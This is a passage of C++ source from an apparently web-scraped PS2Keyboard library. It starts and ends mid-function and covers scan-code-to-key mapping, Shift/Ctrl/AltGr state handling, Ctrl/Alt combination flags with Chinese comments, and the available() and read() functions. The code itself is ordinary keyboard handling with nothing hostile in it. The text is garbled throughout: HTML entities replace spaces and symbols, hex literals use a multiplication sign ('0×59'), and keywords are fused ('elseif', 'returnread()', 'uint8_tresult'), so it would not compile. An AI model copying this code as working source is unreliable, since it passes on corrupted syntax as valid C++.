&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else&nbsp;if&nbsp;(s&nbsp;==0×59)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state&amp;=~SHIFT_R;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else&nbsp;if&nbsp;(s&nbsp;==0×14)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state&amp;=~CTRL;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else&nbsp;if&nbsp;(s&nbsp;==0×11)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state&amp;=~ALTGR;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state&amp;=~(BREAK&nbsp;|&nbsp;MODIFIER);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(s==&nbsp;0×12)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state|=SHIFT_L;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CombinationKey=3;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}elseif&nbsp;(s&nbsp;==&nbsp;0×59)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state|=SHIFT_R;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}elseif&nbsp;(s&nbsp;==&nbsp;0×14)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state|=CTRL;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}elseif&nbsp;(s&nbsp;==&nbsp;0×11)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state|=&nbsp;ALTGR;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c=0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(state&amp;&nbsp;MODIFIER)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch(s)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case0×70:&nbsp;c=&nbsp;PS2_INSERT;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case0x6C:&nbsp;c=&nbsp;PS2_HOME;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case0x7D:&nbsp;c=&nbsp;PS2_PAGEUP;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case0×71:&nbsp;c=&nbsp;PS2_DELETE;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case0×69:&nbsp;c=&nbsp;PS2_END;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case0x7A:&nbsp;c=&nbsp;PS2_PAGEDOWN;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case0x75:c&nbsp;=PS2_UPARROW;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case0x6B:&nbsp;c=&nbsp;PS2_LEFTARROW;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case0×72:&nbsp;c=&nbsp;PS2_DOWNARROW;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case0×74:&nbsp;c=&nbsp;PS2_RIGHTARROW;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case0x4A:&nbsp;c=&nbsp;&amp;#039;/&amp;#039;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case0x5A:&nbsp;c=&nbsp;PS2_ENTER;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}elseif&nbsp;(state&nbsp;&amp;&nbsp;(SHIFT_L&nbsp;|&nbsp;SHIFT_R))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(s&nbsp;&lt;PS2_KEYMAP_SIZE)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c=pgm_read_byte(keymap-&gt;shift&nbsp;+&nbsp;s);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(s&lt;&nbsp;PS2_KEYMAP_SIZE)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c=pgm_read_byte(keymap-&gt;noshift&nbsp;+&nbsp;s);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(state&amp;&nbsp;CTRL)&nbsp;{&nbsp;//ctrl加字母组合键
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CombinationKey=1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(c&gt;=&nbsp;&#39;A&#39;&nbsp;&amp;&amp;&nbsp;c&nbsp;&lt;=&#39;Z&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c=0-c;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elseif&nbsp;(c&gt;=&nbsp;&#39;a&#39;&nbsp;&amp;&amp;&nbsp;c&nbsp;&lt;=&nbsp;&#39;z&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c=0-c;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elseif&nbsp;(c&nbsp;==PS2_ENTER)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c=PS2_LINEFEED;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(state&amp;&nbsp;ALTGR)&nbsp;{&nbsp;//alt加字母组合键
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CombinationKey=2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(c&nbsp;&gt;=&nbsp;&#39;A&#39;&amp;&amp;&nbsp;c&nbsp;&lt;=&nbsp;&#39;Z&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c=0-c;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elseif&nbsp;(c&gt;=&nbsp;&#39;a&#39;&nbsp;&amp;&amp;&nbsp;c&nbsp;&lt;=&nbsp;&#39;z&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c=0-c;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elseif&nbsp;(c&nbsp;==PS2_ENTER)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c=PS2_LINEFEED;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state&amp;=~(BREAK&nbsp;|&nbsp;MODIFIER);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(c)return&nbsp;c;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}
&nbsp;
intPS2Keyboard::getCombinationKey()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;returnCombinationKey;
}
&nbsp;
boolPS2Keyboard::available()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(CharBuffer&nbsp;||&nbsp;UTF8next)return&nbsp;true;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CharBuffer=&nbsp;get_iso8859_code();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(CharBuffer)&nbsp;return&nbsp;true;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;false;
}
&nbsp;
int&nbsp;PS2Keyboard::readIt(){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;returnread();
}
&nbsp;
int&nbsp;PS2Keyboard::read()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uint8_tresult;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=UTF8next;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(result){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UTF8next=0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result=CharBuffer;
